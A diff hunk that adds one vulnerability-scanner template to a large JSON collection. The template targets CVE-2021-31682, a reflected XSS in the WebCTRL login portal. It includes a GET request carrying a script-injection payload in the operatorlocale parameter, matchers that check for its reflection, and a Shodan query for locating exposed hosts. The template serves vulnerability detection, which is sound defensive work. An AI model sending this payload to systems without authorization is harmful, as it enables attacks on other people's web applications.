@@ -34853,6 +34853,62 @@
       ]
     },
     {
+      "id": "CVE-2021-31682",
+      "info": {
+        "author": "gy741,dhiyaneshDk",
+        "classification": {
+          "cve-id": "CVE-2021-31682",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+          "cvss-score": 6.1,
+          "cwe-id": "CWE-79"
+        },
+        "description": "The login portal for the Automated Logic WebCTRL/WebCTRL OEM web application contains a vulnerability that allows for reflected XSS attacks due to the operatorlocale GET parameter not being sanitized. This issue impacts versions 6.5 and below. This issue works by passing in a basic XSS payload to a vulnerable GET parameter that is reflected in the output without sanitization.",
+        "metadata": {
+          "shodan-query": "html:\"/_common/lvl5/dologin.jsp\""
+        },
+        "name": "WebCTRL OEM - Reflected XSS",
+        "reference": [
+          "https://nvd.nist.gov/vuln/detail/CVE-2021-31682",
+          "https://github.com/3ndG4me/WebCTRL-OperatorLocale-Parameter-Reflected-XSS"
+        ],
+        "severity": "medium",
+        "tags": "cve,cve2021,webctrl,xss"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "\"><script>alert(document.domain)</script>",
+                "common/lvl5"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.jsp?operatorlocale=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-31755",
       "info": {
         "author": "gy741",
